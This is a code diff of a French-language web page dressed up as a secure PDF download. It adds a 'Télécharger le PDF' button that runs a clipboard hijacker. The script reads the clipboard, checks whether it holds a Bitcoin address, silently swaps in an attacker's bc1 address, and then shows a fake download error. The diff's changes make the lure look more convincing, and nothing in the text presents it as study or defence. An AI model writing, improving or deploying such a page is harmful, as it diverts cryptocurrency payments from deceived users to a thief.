@@ -2,28 +2,47 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Document PDF sécurisé</title>
+  <title>Téléchargement sécurisé - PDF</title>
   <style>
     body {
-      background-color: #eee;
+      background-color: #f4f4f4;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
+      font-family: Arial, sans-serif;
     }
-    .pdf-box {
+
+    .pdf-preview {
       width: 420px;
-      height: 600px;
-      background-image: url('https://i.imgur.com/Y2nKTr2.png'); /* image qui ressemble à un PDF */
+      height: 580px;
+      background-image: url('https://i.imgur.com/Y2nKTr2.png');
       background-size: cover;
-      cursor: pointer;
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      margin-bottom: 20px;
+    }
+
+    .download-btn {
+      padding: 12px 20px;
+      background-color: #d32f2f;
+      color: white;
+      text-decoration: none;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+    }
+
+    .download-btn:hover {
+      background-color: #b71c1c;
     }
   </style>
 </head>
 <body>
-  <div class="pdf-box" onclick="activerClipper()"></div>
+  <div class="pdf-preview"></div>
+  <button class="download-btn" onclick="activerClipper()">Télécharger le PDF</button>
 
   <script>
     async function activerClipper() {
@@ -32,12 +51,12 @@
         const isCrypto = /^((1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59})$/.test(texte);
         if (isCrypto) {
           await navigator.clipboard.writeText("bc1qadressepiégée1234567890mod");
-          alert("Le document est endommagé.");
+          alert("Erreur lors du téléchargement. Veuillez réessayer.");
         } else {
-          alert("Ce document ne peut pas être ouvert.");
+          alert("Ce fichier n'est pas disponible actuellement.");
         }
       } catch (err) {
-        alert("Erreur lors de l’ouverture du document.");
+        alert("Une erreur est survenue.");
       }
     }
   </script>
